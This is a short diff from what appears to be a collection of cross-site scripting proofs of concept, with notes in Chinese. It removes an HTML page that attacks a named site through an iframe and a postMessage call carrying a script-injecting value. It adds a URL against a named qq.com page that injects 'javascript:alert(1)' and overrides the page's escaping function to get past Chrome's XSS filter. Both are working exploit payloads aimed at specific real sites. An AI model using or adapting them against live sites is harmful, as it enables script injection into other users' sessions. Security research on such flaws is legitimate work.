@@ -1,28 +1,4 @@
-<html>
-<head>
-    <meta name="renderer" content="webkit">
-	<meta charset="utf-8">
-</head>
+利用chrome xss filter bypass
+http://mho.qq.com/wx/page_binding.shtml?back=javascript:alert(1)&test=%3Cscript%3Efunction%20AQ_SECAPI_ESCAPE(Url%2C%20map)%20%7B
 
-<body>
-
-
-
-
-
-<script>
-
-function sc()
-{
-
-    msg = '[{"k":"cna"}, {"k":"tracknick","t":"2995-12-17T03:24:00","v":"\\"+alert(1)+\\""}]';
-	top.test.postMessage(msg,"*");
-}
-
-
-</script>
-
-<iframe src="http://bangpai.rust.com/?ap-debug-lsproxy=1" name="test" onload="sc()"/>
-</body>
-
-</html>
+chrome下测试，过程跟之前一样
